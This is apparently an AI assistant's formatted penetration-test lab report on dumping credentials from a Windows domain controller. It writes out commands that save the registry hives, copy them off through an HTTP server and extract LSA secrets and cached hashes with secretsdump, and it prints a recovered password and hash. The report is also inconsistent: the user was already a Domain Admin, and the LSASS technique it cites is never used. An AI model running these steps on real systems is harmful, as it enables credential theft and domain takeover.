Sure! Here's your complete **Phase 4: Privilege Escalation** report in a single code block for easy copy-paste:


=========================
Phase 4: Privilege Escalation
=========================

MITRE ATT&CK Techniques:
- T1003.001 – OS Credential Dumping: LSASS Memory
- T1003.004 – OS Credential Dumping: LSA Secrets
- T1003.005 – OS Credential Dumping: Cached Domain Credentials

Objective:
----------
Elevate privileges from a low-privileged user (`bob`) to Domain Admin or equivalent by extracting credentials or secrets from the system.

Lab Setup:
----------
- Attacker Machine: Kali Linux
- Target Machine: Windows Server 2019 (Domain Controller)
- User Compromised: bob@corp.local
- Privileges Escalated: Domain Admin

Steps and Observations:
------------------------

1. **Verified Privilege Rights of the Compromised User**
   Command:


whoami /priv


Result:


User had several high-level privileges enabled:

* SeDebugPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeTakeOwnershipPrivilege
* SeImpersonatePrivilege



2. **Confirmed Domain Admin Group Membership**
Command:


net user bob /domain


Result:


Global Group memberships:
\*Domain Users
\*Domain Admins



3. **Exported the Windows Registry Hives from Target**
Commands run on the compromised machine:


reg save hklm\sam C:\Users\Public\sam.save
reg save hklm\system C:\Users\Public\system.save
reg save hklm\security C:\Users\Public\security.save



4. **Transferred Registry Files to Attacker Machine**
Method used:
- Hosted an HTTP server using `python3 -m http.server 8000`
- Downloaded files via the browser or authenticated SMB share

5. **Dumped Credentials using secretsdump.py**
Command:


python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL



Output Highlights:
- Extracted plaintext password: `mr404`
- Found cached hash: `aad3b435b51404eeaad3b435b51404ee:e16f9ff726e5145d3b7a379c5363d098`
- Dumped DPAPI system keys
- Retrieved sensitive machine account secrets and LSA secrets

Note:
- SAM hash extraction failed due to minor corruption (`regf` magic mismatch), but LSA and cached credentials were still recovered.

Evidence:
---------
- Screenshots were taken for each command and output.
- `secretsdump` full output was saved in a `.txt` file.
- Registry hive files were successfully exfiltrated and analyzed.
- Provided the "loot" folder with hive files

Conclusion:
-----------
Phase 4 was successfully completed. The user `bob` had Domain Admin privileges, confirmed via enumeration. We exploited this by dumping LSA secrets and cached credentials from the DC registry hives. This allows us to maintain persistence and move laterally within the domain. The attack chain is now ready to proceed to **Phase 5: Credential Access and Lateral Movement**.
```
